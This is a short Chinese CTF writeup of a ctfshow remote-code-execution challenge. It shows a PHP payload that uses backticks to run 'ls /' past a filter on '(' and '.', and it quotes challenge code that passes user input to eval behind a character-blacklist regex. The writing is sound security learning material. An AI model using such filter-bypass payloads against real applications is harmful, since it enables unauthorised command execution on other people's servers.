---

title: "复现 ctfshow 每周大挑战(RCE极限挑战)"
date: 2025-07-31 00:00:00
updated: 2025-09-02 00:00:00
author: Xendr1a
categories:
  - ctfshow
tags:
  - RCE
  - writeup
  - ctfshow


---

附上官方 wp: https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah

## 一

可以看到是过滤了 `(` 和 `.`。那么 `system()` 是不能用了，直接用反引号执行命令的姿势来使用，例如：

```php
code=echo `ls /`;
```

## 二

```php
if(preg_match("/\"|`~\\\\]/",$ctfshow)){
    eval($ctfshow);
}else{
    echo("Are you hacking me AGAIN?");
}
```

过滤的字符集合：`"/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/"`，尝试找出没有被过滤的字符。
